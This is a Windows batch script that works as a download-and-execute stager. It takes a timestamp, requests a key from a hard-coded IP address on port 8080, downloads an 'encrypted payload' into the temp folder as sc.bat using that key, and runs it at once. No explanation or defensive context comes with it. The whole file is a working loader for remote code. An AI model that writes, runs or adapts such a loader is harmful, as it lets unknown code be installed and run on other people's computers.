@echo off
setlocal

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat

REM ===== TS =====
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i

REM ===== KEY =====
for /f %%i in ('curl -s "%BASE%/auth/key?ts=%TS%"') do set KEY=%%i

REM ===== PAYLOAD =====
curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"

REM ===== EXEC (sincrono) =====
call "%FILE%"